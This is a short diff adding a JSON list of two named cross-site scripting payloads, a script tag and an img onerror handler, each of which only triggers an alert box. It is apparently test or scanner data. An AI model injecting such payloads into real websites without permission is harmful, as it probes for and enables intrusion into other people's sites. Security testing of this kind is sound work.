@@ -1,0 +1,10 @@
+[
+   {
+      "name":"Basic Tag Payload",
+      "payload":"<script>alert()</script>"
+   },
+   {
+      "name":"XSS with img tag",
+      "payload":"<img src=x onerror=alert()>"
+   }
+]
